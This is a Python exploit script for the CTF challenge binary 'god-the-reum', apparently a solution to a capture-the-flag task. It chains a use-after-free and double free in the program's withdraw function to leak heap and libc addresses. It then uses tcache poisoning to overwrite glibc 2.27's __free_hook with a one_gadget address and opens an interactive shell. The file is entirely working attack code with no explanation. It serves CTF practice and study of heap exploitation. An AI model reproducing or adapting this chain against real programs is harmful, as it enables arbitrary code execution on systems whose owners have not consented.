# File: exp.py
# Author: raycp
# Date: 2019-06-03
# Description: exp for god-the-reum,uaf in withdraw function

from pwn_debug import *


pdbg=pwn_debug("./god-the-reum")

pdbg.context.terminal=['tmux', 'splitw', '-h']

pdbg.local("./libc-2.27.so","/glibc/x64/2.27/lib/ld-2.27.so")
pdbg.debug("2.27")
#pdbg.remote('127.0.0.1', 22)
p=pdbg.run("local")
#p=pdbg.run("remote")
#p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def create(eth):
    p.recvuntil("choice : ")
    p.sendline("1")
    p.recvuntil("eth? : ")
    p.sendline(str(eth))


def deposit(idx,eth):
    p.recvuntil("choice : ")
    p.sendline("2")
    p.recvuntil("wallet no : ")
    p.sendline(str(idx))
    p.recvuntil("sit? : ")
    p.sendline(str(eth))

def withdraw(idx,eth):
    p.recvuntil("choice : ")
    p.sendline("3")
    p.recvuntil("wallet no : ")
    p.sendline(str(idx))
    p.recvuntil("aw? : ")
    p.sendline(str(eth))


def show():
    p.recvuntil("choice : ")
    p.sendline("4")


def pwn():
    
    #pdbg.bp()
    create(0xf0)  #0
    create(0x60)  #1

    # step1 double free to get heap address
    withdraw(0,0xf0)
    withdraw(0,0)
    
    show()
    
    p.recvuntil("ballance ")
    heap_base=int(p.recvuntil("\n")[:-1])-0x2f0
    log.info("leak heap base: %s"%(hex(heap_base)))
   
    # step2 fill the tcache chain
    for i in range(0,5):
        withdraw(0,heap_base+0x2f0)
    
    # step3 put the chunk to unsorted bin and leak libc address
    withdraw(0,heap_base+0x2f0)
    show() 
    p.recvuntil("ballance ")
    unsorted_addr=int(p.recvuntil("\n")[:-1])
    #libc_base=unsorted_addr-libc.symbols['main_arena']-0x60
    libc_base=unsorted_addr-0x3ebca0
    log.info("leak libc base: %s"%(hex(libc_base)))
    free_hook=libc_base+libc.symbols['__free_hook']
    malloc_hook=libc_base+libc.symbols['__malloc_hook']
    system_addr=libc_base+libc.symbols['system']
    binsh_addr=libc_base+next(libc.search("/bin/sh"))
    rce=libc_base+0x4f322

    # step4 tcache attack and change tcache chain with 0x70 to fre_hook
    withdraw(1,0x60)
    withdraw(1,0x10000000000000000-free_hook)

    #pdbg.bp(0xe12)
    # malloc out the first bin
    create(0x60) #2
    
    # step5 malloc out free_hook
    #pdbg.bp(0xe12)
    create(0x60) #3
    # step6 write rce to free_hook 
    withdraw(3,0x10000000000000000+0x60-rce)

    # step7 trigger free
    pdbg.bp([0xcac,0xfad])
    withdraw(2,0x60)
    
    p.interactive() 

if __name__ == '__main__':
    pwn()


